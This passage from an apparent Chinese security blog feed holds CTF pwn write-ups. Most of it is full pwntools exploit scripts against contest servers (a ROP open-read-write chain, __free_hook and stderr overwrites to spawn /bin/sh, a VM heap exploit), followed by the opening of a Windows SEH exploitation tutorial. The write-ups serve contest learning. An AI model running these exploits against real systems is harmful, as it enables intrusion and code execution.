class="number">0x0000000000001b92</span></span><br><span class="line">puts_addr=libc_base+libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">read_addr=libc_base+libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">bss=libc_base + libc.symbols[<span class="string">'__free_hook'</span>]+<span class="number">0x2000</span></span><br><span class="line">orw=p64(poprdi)+p64(flag_addr)+p64(poprsi)+p64(<span class="number">72</span>)+p64(open_addr)+p64(poprdi)+p64(<span class="number">3</span>)+p64(poprsi)+p64(bss)+p64(poprdx)+p64(<span class="number">0x30</span>)+p64(read_addr)</span><br><span class="line">orw+=p64(poprdi)+p64(bss)+p64(puts_addr)+<span class="string">"/flag\x00"</span></span><br><span class="line">s(orw)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>​        <img src="./7.png" alt="img">      </p><h2><span id="shortest_path_v2">Shortest_Path_v2</span></h2><p>这一题是非预期，程序读入flag直接遗留在heap段了，后面申请chunk,直接就可以拿到，这次比赛的非预期真多。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'Shortest_path'</span></span><br><span class="line"><span class="comment">#ctx.remote_libc = './libc.so'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line">p=rs()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ctx.remote = (<span class="string">'121.37.181.246'</span>,<span class="number">19008</span>)</span><br><span class="line">p=rs(<span class="string">'remote'</span>)</span><br><span class="line"><span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">libc_base = ctx.bases.libc</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">ctx.symbols = &#123;<span class="string">'sym1'</span>:<span class="number">0xEDA</span> , <span class="string">'sym2'</span>:<span class="number">0x10AF</span>&#125;</span><br><span class="line">ctx.breakpoints = [<span class="number">0xEDA</span>,<span class="number">0x10AF</span>]</span><br><span class="line">ctx.debug()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(ID,name_size,name,index,distance)</span>:</span></span><br><span class="line">sla(<span class="string">"---&gt; "</span>,<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">"Station ID: "</span>,ID)</span><br><span class="line">sla(<span class="string">"Station Price: "</span>, <span class="number">1</span>)</span><br><span class="line">sla(<span class="string">"Station Name Length: "</span>,str(name_size))</span><br><span class="line">sla(<span class="string">"Station Name: \n"</span>,name)</span><br><span class="line">sla(<span class="string">'Number of connected station: '</span>,len(index))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(index)):</span><br><span class="line">sla(<span class="string">"station ID: "</span>,index[i])</span><br><span class="line">sla(<span class="string">"distance: "</span>,distance[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">sla(<span class="string">"---&gt; "</span>,<span class="number">3</span>)</span><br><span class="line">sla(<span class="string">"Station ID: "</span>,index)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(source,target)</span>:</span></span><br><span class="line">sla(<span class="string">"---&gt; "</span>,<span class="number">4</span>)</span><br><span class="line">sla(<span class="string">"Source Station ID: "</span>,str(source))</span><br><span class="line">sla(<span class="string">"Target Station ID: "</span>,str(target))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">sla(<span class="string">"---&gt; "</span>,<span class="number">2</span>)</span><br><span class="line">sla(<span class="string">"Station ID: "</span>,index)</span><br><span class="line"></span><br><span class="line">choice()</span><br><span class="line">create(<span class="number">0</span>,<span class="number">0xf7</span>,<span class="string">"1"</span>*<span class="number">0xf7</span>,[<span class="number">2</span>],[<span class="number">123</span>])</span><br><span class="line">create(<span class="number">1</span>,<span class="number">0xb8</span>,<span class="string">"1"</span>*<span class="number">0xb7</span>,[<span class="number">2</span>],[<span class="number">123</span>])</span><br><span class="line">sla(<span class="string">"---&gt; "</span>,<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">"Station ID: "</span>,<span class="number">2</span>)</span><br><span class="line">sla(<span class="string">"Station Price: "</span>, <span class="string">'1'</span>)</span><br><span class="line">sla(<span class="string">"Station Name Length: "</span>,<span class="string">'-'</span>)</span><br><span class="line">sa(<span class="string">'Station Name: \n'</span>,<span class="string">'0'</span>)</span><br><span class="line">sla(<span class="string">'Number of connected station: '</span>,<span class="number">0</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>​        <img src="./8.png" alt="img">      </p><h2><span id="bjut">bjut</span></h2><p>数组越界读写，直接可以修改stderr，因为是write泄露，并且字节特别大。同样的用modify越界修改stderr,然后可以修改到__free_hook。不过这样利用成功概率不大，需要不断尝试。我看其他队伍的wp，数组越界竟然到了负一千多的地方，可怕。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">''</span></span><br><span class="line"><span class="comment">#ctx.remote_libc = './libc.so'</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line">p=rs()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ctx.remote = (<span class="string">'121.37.167.199'</span>,<span class="number">9997</span>)</span><br><span class="line">p=rs(<span class="string">'remote'</span>)</span><br><span class="line"><span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;"</span>,<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">"The length of your hw:\n"</span>,size)</span><br><span class="line">sa(<span class="string">"Input your hw:\n"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;"</span>,<span class="number">4</span>)</span><br><span class="line">sla(<span class="string">"The index of your hw:"</span>,index)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;"</span>,<span class="number">2</span>)</span><br><span class="line">sla(<span class="string">"The index of your hw:"</span>,index)</span><br><span class="line">sa(<span class="string">"Input your hw:"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;"</span>,<span class="number">3</span>)</span><br><span class="line">sla(<span class="string">"The index of your hw:"</span>,index)</span><br><span class="line">choice()</span><br><span class="line">create(<span class="number">0x7f</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">create(<span class="number">0x7f</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">show(<span class="number">-16</span>)</span><br><span class="line">ru(<span class="string">"\x77\x3a\x0a"</span>)</span><br><span class="line">info=r()</span><br><span class="line">libc_base=uu64(info[<span class="number">13</span>*<span class="number">8</span>:<span class="number">14</span>*<span class="number">8</span>])-(<span class="number">0x7f8e26d55760</span><span class="number">-0x00007f8e26b70000</span>)</span><br><span class="line">leak(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line"><span class="keyword">print</span> hex(len(info))</span><br><span class="line">pause()</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">edit(<span class="number">-16</span>,info+(<span class="number">0x1f28</span>-len(info))*<span class="string">'\x00'</span>+p64(system))</span><br><span class="line">sla(<span class="string">"&gt;"</span>,<span class="number">5</span>)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p><img src="./9.png" alt="img">       </p><h2><span id="babyhacker">babyhacker</span></h2><p>这算是出题方的失误吧，题目flag直接包裹在题目附件里面。属实不想吐槽这种非预期。</p><p><img src="./10.png" alt="img"> </p><h2><span id="easyvm">EasyVm</span></h2><p>这一题可以操作的方式太多了，唯一难点就是泄露，修改多种方式都可以。有利用putchar任意泄露的，用getchar任意修改，还可以free之后main_arena的地址直接给了reg[1],直接可以打印出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'EasyVM'</span></span><br><span class="line"><span class="comment">#ctx.remote_libc = './libc.so'</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>)</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line">p=rs()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ctx.remote = (<span class="string">'121.36.215.224'</span>,<span class="number">9999</span>)</span><br><span class="line">p=rs(<span class="string">'remote'</span>)</span><br><span class="line"><span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">libc_base = ctx.bases.libc</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">ctx.symbols = &#123;<span class="string">'sym1'</span>:<span class="number">0xF72</span>&#125;</span><br><span class="line">ctx.breakpoints = [<span class="number">0xF72</span>]</span><br><span class="line">ctx.debug()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(content)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;&gt;&gt; \n"</span>,<span class="number">1</span>)</span><br><span class="line">s(content+<span class="string">'\x99\x99\x99'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;&gt;&gt; \n"</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span><span class="params">()</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;&gt;&gt; \n"</span>,<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;&gt;&gt; \n"</span>,<span class="number">3</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">(content)</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'\x71'</span>+content</span><br><span class="line">choice()</span><br><span class="line">create(<span class="string">'\x80\x10/bin\x80\x10/sh\x00'</span>+push(p32(<span class="number">0x66666666</span>))*<span class="number">77</span>)</span><br><span class="line">run()</span><br><span class="line">free()</span><br><span class="line">create(<span class="string">'\x11'</span>)</span><br><span class="line">run()</span><br><span class="line">ru(<span class="string">'0x'</span>)</span><br><span class="line">libc_base=int(r(<span class="number">8</span>),<span class="number">16</span>)-(<span class="number">0xf7efe930</span><span class="number">-0xf7d4c000</span>)</span><br><span class="line">leak(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">create(push(p32(free_hook))+<span class="string">'\x76\x00\x00\x00\x00\x54\x00'</span>+push(p32(free_hook+<span class="number">1</span>))+<span class="string">'\x76\x00\x00\x00\x00\x54\x00'</span>+push(p32(free_hook+<span class="number">2</span>))+<span class="string">'\x76\x00\x00\x00\x00\x54\x00'</span>+push(p32(free_hook+<span class="number">3</span>))+<span class="string">'\x76\x00\x00\x00\x00\x54\x00'</span>)</span><br><span class="line">run()</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">s(p32(system)[<span class="number">0</span>])</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">s(p32(system)[<span class="number">1</span>])</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">s(p32(system)[<span class="number">2</span>])</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">s(p32(system)[<span class="number">3</span>])</span><br><span class="line">create(push(<span class="string">"/sh\x00"</span>)+push(<span class="string">"/bin"</span>))</span><br><span class="line">run()</span><br><span class="line">free()</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h2><span id="babyhacker2">babyhacker2</span></h2><p>这一题是赛后复现，看来其他队伍的wp,我吐了，就没有一个规规矩矩解的，我说怎么秒的那么快。</p><p>首先是NU1L:  </p><p><img src="./2.png" alt></p><p>修改二进制文件umount,最后exit的时候触发/bin/sh，成功拿到flag。这题局限性是对方用qume起的虚拟机，不然真实机器直接退出了。</p><p>然后V&amp;N:</p><p><img src="./3.png" alt></p><p>这个没弄懂，反正以后比赛可以试一下。</p><h2><span id="kernoob">kernoob</span></h2><p>我真是吃了没有strings的亏，这一题flag还是在附件里面，只不过不是在flag文件里面，在其他地方。</p><p><img src="./1.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;&lt;span id=&quot;summary&quot;&gt;summary&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;这次比赛总的来说发挥还算不错，虽然没有抢到一血，但是至少做出题目了。对kernel题目来说不太熟练，甚至是有点忘了怎么去做了，有时间了一定要多多熟练kernel的利用，不过这次的每道kern
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://Whali3n51.top/categories/Writeup/"/>
    
    
      <category term="house of orange" scheme="http://Whali3n51.top/tags/house-of-orange/"/>
    
      <category term="VMpwn" scheme="http://Whali3n51.top/tags/VMpwn/"/>
    
      <category term="SROP" scheme="http://Whali3n51.top/tags/SROP/"/>
    
      <category term="沙盒" scheme="http://Whali3n51.top/tags/%E6%B2%99%E7%9B%92/"/>
    
  </entry>
  
  <entry>
    <title>win_SEH利用初探</title>
    <link href="http://whali3n51.top/2020/02/07/win-SEH%E5%88%A9%E7%94%A8%E5%88%9D%E6%8E%A2/"/>
    <id>http://whali3n51.top/2020/02/07/win-SEH%E5%88%A9%E7%94%A8%E5%88%9D%E6%8E%A2/</id>
    <published>2020-02-07T02:45:11.000Z</published>
    <updated>2020-04-15T01:51:21.499Z</updated>
    
    <content type="html"><![CDATA[<p>武汉加油！湖北加油！</p><p>被疫情隔离在家，很久之前就学会了，但是一直没有时间写，现在终于有时间写一写了。</p><p>这个利用其实和linux下的利用差别还是很大的，要控制好几个结构体，要利用到SEH链。</p><p>先给大家推荐两篇文章吧，我就是照着这两篇文章学习的，这里只是把这两盘文章写的不够详细或者我觉得我难以理解的地方指出来，并且加以总结。</p><p><a href="https://www.anquanke.com/post/id/188170" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188170</a></p><p><a href="http://blog.eonew.cn/archives/1182" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1182</a></p><p>首先要了解一下这几个结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EH4_SCOPETABLE</span> &#123;</span></span><br><span class="line">        DWORD GSCookieOffset;</span><br><span class="line">        DWORD GSCookieXOROffset;</span><br><span class="line">        DWORD EHCookieOffset;</span><br><span class="line">        DWORD EHCookieXOROffset;</span><br><span class="line">        _EH4_SCOPETABLE_RECORD ScopeRecord[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EH4_SCOPETABLE_RECORD</span> &#123;</span></span><br><span class="line">        DWORD EnclosingLevel;</span><br><span class="line">        <span class="keyword">long</span> (*FilterFunc)();</span><br><span class="line">            <span class="keyword">union</span> &#123;</span><br><span class="line">            <span class="keyword">void</span> (*HandlerAddress)();</span><br><span class="line">            <span class="keyword">void</span> (*FinallyFunc)(); </span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这些结构体的是SHE储存的信息，并且这些值是存储在rdata段的，其中_EH4_SCOPETABLE_RECORD存储的是异常处理的函数，当发生异常时，就会调用这个结构体存储的函数。还有注意看嗷,__EH4_SCOPETABLE里面结构体的内容有一项 _EH4_SCOPETABLE_RECORD ScopeRecord[1],也就是这里直接将 _EH4_SCOPETABLE_RECORD的值存进去了</p><p>也就是可以这么理解了，虽然这里不怎么准确，但是我们伪造SCOPETABLE的时候就可以这么伪造了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EH4_SCOPETABLE</span> &#123;</span></span><br><span class="line">        DWORD GSCookieOffset;</span><br><span class="line">        DWORD GSCookieXOROffset;</span><br><span class="line">        DWORD EHCookieOffset;</span><br><span class="line">        DWORD EHCookieXOROffset;</span><br><span class="line">        DWORD EnclosingLevel;</span><br><span class="line">    <span class="keyword">long</span> (*FilterFunc)();</span><br><span class="line">      <span class="keyword">union</span> &#123;</span><br><span class="line">            <span class="keyword">void</span> (*HandlerAddress)();</span><br><span class="line">            <span class="keyword">void</span> (*FinallyFunc)(); </span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里我们主要劫持long (*FilterFunc)();</p><p>关于如何选择存储信息来判断代码的正确性，下面则是选择逻辑。</p><p>说实话，直接看的有点生硬，还是结合题目来理解。</p><p>例子就是这道win_babystack</p><p>题目链接:<a href="babystack.zip">babystack.zip</a></p><p><img src="1.png" alt="image-20200207120145189"></p><p>这一道题最初给了main函数地址和stack地址。</p><p>大大降低了我们难度。</p><p>然后这下面还有任意地址泄露，说明确实是个baby题</p><p><img src="2.png" alt="image-20200207120434082"></p><p>然后漏洞在这里</p><p><img src="3.png" 